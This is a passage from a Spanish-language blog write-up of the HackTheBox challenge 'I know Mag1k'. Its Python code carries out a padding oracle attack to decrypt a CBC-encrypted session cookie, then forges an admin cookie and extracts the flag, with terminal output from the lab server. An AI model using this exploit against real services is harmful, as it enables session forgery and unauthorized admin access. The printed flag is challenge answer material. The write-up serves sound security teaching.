</code></pre></div><p>En primer lugar, dividimos la <em>cookie</em> en bloques de 8 bytes:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">iknowmag1k</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">b64d</span><span class="mtk1">(</span><span class="mtk8">unquote</span><span class="mtk1">(</span><span class="mtk1">iknowmag1k</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">blocks</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk1">iknowmag1k</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">:</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">] </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">iknowmag1k</span><span class="mtk1">), </span><span class="mtk6">8</span><span class="mtk1">)]</span>  
</code></pre></div><p>Ahora, podemos realizar un <em>Padding Oracle Attack</em> para encontrar el carácter de texto claro del último byte del último bloque:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">ct_block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">blocks</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk1">prev_block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">blocks</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> [</span><span class="mtk1">b</span><span class="mtk1">])</span>
<span class="mtk1">        </span><span class="mtk1">cookie</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">quote</span><span class="mtk1">(</span><span class="mtk8">b64e</span><span class="mtk1">(</span><span class="mtk1">block</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">ct_block</span><span class="mtk1">))</span>  

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">oracle</span><span class="mtk1">(</span><span class="mtk1">cookie</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">dec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">01</span>
<span class="mtk1">            </span><span class="mtk1">pt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk1">prev_block</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk1">dec</span><span class="mtk1">])</span>
<span class="mtk1">            </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">pt</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">break</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.101.249:30015
[<span class="code-blue">*</span>] PHPSESSID: ogkh3f77n05pmatkfoh5o8ips6
[<span class="code-blue">*</span>] iknowmag1k: vctCAXksA%2BHgw9p1P%2F9UaNhqtxuqlkhmTtxnKnpEJ1EEdWrK5th6Ag%3D%3D  
b'\x03'

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.101.249:30015
[<span class="code-blue">*</span>] PHPSESSID: kqf9u5t4i2156cqv0n5c0jnha7
[<span class="code-blue">*</span>] iknowmag1k: vQMfBFF43WNqjW2WWG1UIOWHQ%2FDdLRkSsMUHPmPNC7lzECYpHJiCFw%3D%3D
b'\x03'

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.101.249:30015
[<span class="code-blue">*</span>] PHPSESSID: 3b5mnm76kgfuuoaenr3thnivu6
[<span class="code-blue">*</span>] iknowmag1k: abpONIveuq9nS4G%2FZ7G9BY2XtDwl3CzGWgrADHxKFzJhuX6eUiTbDw%3D%3D
b'\x03'
</code></pre></div><p>Como se puede ver, estamos obteniendo <code>0x03</code>, que tiene sentido debido al relleno PKCS7.</p><p>Nótese que cuando no hay error, aplicamos XOR con <code>0x01</code>, porque esperamos un relleno de un solo byte. Para continuar con el ataque, necesitamos que el relleno sea <code>"\x02\x02"</code>. Como ya sabemos el último byte, podemos forzar el último byte de texto claro a que sea <code>\x02</code>, así que iteramos el penúltimo byte hasta que no haya error:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> [</span><span class="mtk1">b</span><span class="mtk1">] </span><span class="mtk5">+</span><span class="mtk1"> [</span><span class="mtk1">dec</span> <span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">02</span><span class="mtk1">])</span>  
<span class="mtk1">        </span><span class="mtk1">cookie</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">quote</span><span class="mtk1">(</span><span class="mtk8">b64e</span><span class="mtk1">(</span><span class="mtk1">block</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">ct_block</span><span class="mtk1">))</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">oracle</span><span class="mtk1">(</span><span class="mtk1">cookie</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">dec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">02</span>
<span class="mtk1">            </span><span class="mtk1">pt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk1">prev_block</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk1">dec</span><span class="mtk1">])</span>
<span class="mtk1">            </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">pt</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">break</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.101.249:30015
[<span class="code-blue">*</span>] PHPSESSID: sg8tkeof8qbb8q81aivuujblt5
[<span class="code-blue">*</span>] iknowmag1k: JvZLT6WH327eIDtcmRG0Rvjpjd1K1qx3gfSqNmlyqILN57ybZy3BJw%3D%3D  
b'\x03'
b'\x03'
</code></pre></div><h3 id="descifrado">Descifrado</h3><p>Muy bien, generalizaremos para todos los caracteres de un bloque en una función:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">decrypt_block</span><span class="mtk1">(</span><span class="mtk9 mtki">ct_block</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">dec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>
<span class="mtk1">        </span><span class="mtk1">k</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> []</span>

<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk1">block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> [</span><span class="mtk1">b</span><span class="mtk1">] </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">k</span><span class="mtk1">)</span>
<span class="mtk1">                </span><span class="mtk1">cookie</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">quote</span><span class="mtk1">(</span><span class="mtk8">b64e</span><span class="mtk1">(</span><span class="mtk1">block</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk9 mtki">ct_block</span><span class="mtk1">))</span>

<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">oracle</span><span class="mtk1">(</span><span class="mtk1">cookie</span><span class="mtk1">):</span>
<span class="mtk1">                    </span><span class="mtk1">dec</span><span class="mtk1">[</span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk1">k</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [(</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk1">dec</span><span class="mtk1">[</span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">j</span><span class="mtk1">] </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">j</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)][::</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">]</span>  
<span class="mtk1">                    </span><span class="mtk5">break</span>

<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">(dec)</span>
</code></pre></div><p>Ahora podemos descifrar un bloque completo de 8 bytes:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">current_block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">blocks</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk1">prev_block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">blocks</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">dec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">decrypt_block</span><span class="mtk1">(</span><span class="mtk1">current_block</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">plaintext</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">dec</span><span class="mtk1">, </span><span class="mtk1">prev_block</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">plaintext</span>  
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">plaintext</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.101.249:30015
[<span class="code-blue">*</span>] PHPSESSID: e97d6b0bg766paq53nfiipniq1
[<span class="code-blue">*</span>] iknowmag1k: 64vMeA4l9Nf9SN4kKSa1AWbRDVVpZm%2F5n5tcOBuyrL5y%2B9m4a0siNA%3D%3D  
b'ser"}\x03\x03\x03'
</code></pre></div><p>Perfecto, ahora es momento de descifrar la <em>cookie</em> completa (también agregué algunos indicadores de progreso con <a target="_blank" href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">m</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">blocks</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">current_block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">blocks</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">m</span><span class="mtk1">]</span>
<span class="mtk1">        </span><span class="mtk1">prev_block</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">blocks</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">m</span><span class="mtk1">]</span>

<span class="mtk1">        </span><span class="mtk1">dec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">decrypt_block</span><span class="mtk1">(</span><span class="mtk1">current_block</span><span class="mtk1">)</span>

<span class="mtk1">        </span><span class="mtk1">plaintext</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">dec</span><span class="mtk1">, </span><span class="mtk1">prev_block</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">plaintext</span>  
<span class="mtk1">        </span><span class="mtk1">dec_prog</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">plaintext</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">dec_prog</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">plaintext</span><span class="mtk1">))</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.101.249:30015
[<span class="code-blue">*</span>] PHPSESSID: las5em34op5addcv86ap1sbig7
[<span class="code-blue">*</span>] iknowmag1k: 8%2BgJhWJf%2FaR79lcmw0Q9PpSrEekCPow1aSZiWaWPBn594EbgeUnCUA%3D%3D  
[<span class="code-green">+</span>] Decrypted: b'{"user":"asdf","role":"user"}\x03\x03\x03'
[<span class="code-blue">▘</span>] Bytes: 8 / 8
</code></pre></div><p>Esperaba ver la <em>flag</em> aquí&mldr; pero parece que necesitamos obtener acceso como administrador. Esta es la descripción del reto:</p><blockquote><p><em>Can you get to the profile page of the admin?</em></p></blockquote><p>Podemos adivinar que necesitamos cifrar <code>{"user":"asdf","role":"admin"}</code> en la <em>cookie</em>.¡Afortunadamente, el <em>Padding Oracle Attack</em> es tan poderoso que incluso puede usarse para cifrar información arbitraria!</p><h3 id="cifrado">Cifrado</h3><p>Usaremos el siguiente código para cifrar los datos en <code>want</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">want</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'{"user":"asdf","role":"admin"}</span><span class="mtk6">\x02\x02</span><span class="mtk4">'</span>  
<span class="mtk1">    </span><span class="mtk1">ct</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>
<span class="mtk1">    </span><span class="mtk1">encrypted</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk1">want</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">block</span><span class="mtk1">, </span><span class="mtk1">want</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">want</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">8</span><span class="mtk1">:], </span><span class="mtk1">want</span><span class="mtk1">[:</span><span class="mtk5">-</span><span class="mtk6">8</span><span class="mtk1">]</span>
<span class="mtk1">        </span><span class="mtk1">dec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">decrypt_block</span><span class="mtk1">(</span><span class="mtk1">ct</span><span class="mtk1">[:</span><span class="mtk6">8</span><span class="mtk1">])</span>
<span class="mtk1">        </span><span class="mtk1">ct</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">dec</span><span class="mtk1">), </span><span class="mtk1">block</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">ct</span>
<span class="mtk1">        </span><span class="mtk5">assert</span><span class="mtk1"> </span><span class="mtk8">oracle</span><span class="mtk1">(</span><span class="mtk8">quote</span><span class="mtk1">(</span><span class="mtk8">b64e</span><span class="mtk1">(</span><span class="mtk1">ct</span><span class="mtk1">)))</span>
<span class="mtk1">        </span><span class="mtk1">encrypted</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">block</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">encrypted</span>
<span class="mtk1">        </span><span class="mtk1">enc_prog</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">encrypted</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">cookie</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">quote</span><span class="mtk1">(</span><span class="mtk8">b64e</span><span class="mtk1">(</span><span class="mtk1">ct</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">poa</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">enc_prog</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk1">cookie</span><span class="mtk1">)</span>
</code></pre></div><p>Respiremos profundamente y analicemos lo anterior. Primero, tomamos un bloque arbitrario de texto cifrado (todos bytes nulos) y llamamos a la función <code>decrypt_block</code>. Obtendremos el texto claro correspondiente (no nos importa esto). La clave es que controlamos el IV, por lo que podemos calcular un IV de tal manera que el XOR entre el IV y la salida del descifrador dé como resultado el texto claro que queremos (<code>dmin"}\x02\x02</code>):</p><p><img alt="I know Mag1k 13" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-13.webp"></p><p>Luego, este IV especial se toma como el siguiente bloque de texto cifrado para descifrar:</p><p><img alt="I know Mag1k 14" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-14.webp"></p><p>Entonces, podemos obtener otro IV que hará que el texto claro resulte en lo que deseamos. Y todo este proceso se automatiza en el fragmento de código anterior.</p><p>Usando esto, podemos cifrar cualquier mensaje, para que podamos falsificar la <em>cookie</em> e iniciar sesión como administrador. Finalmente, podemos agregar más código para extraer la <em>flag</em> del código HTML:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">url</span><span class="mtk6">}</span><span class="mtk4">/profile.php'</span><span class="mtk1">, </span><span class="mtk9 mtki">cookies</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'PHPSESSID'</span><span class="mtk1">: </span><span class="mtk1">phpsessid</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'iknowmag1k'</span><span class="mtk1">: </span><span class="mtk1">cookie</span>
<span class="mtk1">    })</span>

<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk4">'Flag: '</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8 mtku">re</span><span class="mtk1">.</span><span class="mtk8">findall</span><span class="mtk1">(</span><span class="mtk7 mtki">r</span><span class="mtk4">'HTB</span><span class="mtk6">\{</span><span class="mtk4">.</span><span class="mtk5">*?</span><span class="mtk6">\}</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">r</span><span class="mtk1">.</span><span class="mtk1">text</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">])</span>  
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Si ejecutamos el <em>script</em>, encontraremos la <em>flag</em> después de unos 10 minutos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.101.249:30015
[<span class="code-blue">*</span>] PHPSESSID: p18u75484rfkv6ntpdnpbkvar7
[<span class="code-blue">*</span>] iknowmag1k: RNIGRz8VJdPbnP0rlSenxXDeYCWAsIoxGS6JlNddO8wSpkWZ9nPNDw%3D%3D
[<span class="code-green">+</span>] Decrypted: b'{"user":"asdf","role":"user"}\x03\x03\x03'
[<span class="code-green">+</span>] Encrypted: 1sTI9HtrAIrxUJ%2BQfHTNi1ArH3JXLFFyNQMrqEHXZZwAAAAAAAAAAA%3D%3D  
[<span class="code-green">+</span>] Bytes: Done
[<span class="code-green">+</span>] Flag: HTB{Padd1NG_Or4cl3z_AR3_WaY_T0o_6en3r0ys_ArenT_tHey???}
</code></pre></div><p>El <em>script</em> completo se puede encontrar aquí: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Crypto/I%20know%20Mag1k/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-cifrado">Análisis del cifrado</a><ul><li><a href="#_padding-oracle-attack_"><em>Padding Oracle Attack</em></a></li><li><a href="#pruebas">Pruebas</a></li><li><a href="#descifrado">Descifrado</a></li><li><a href="#cifrado">Cifrado</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" 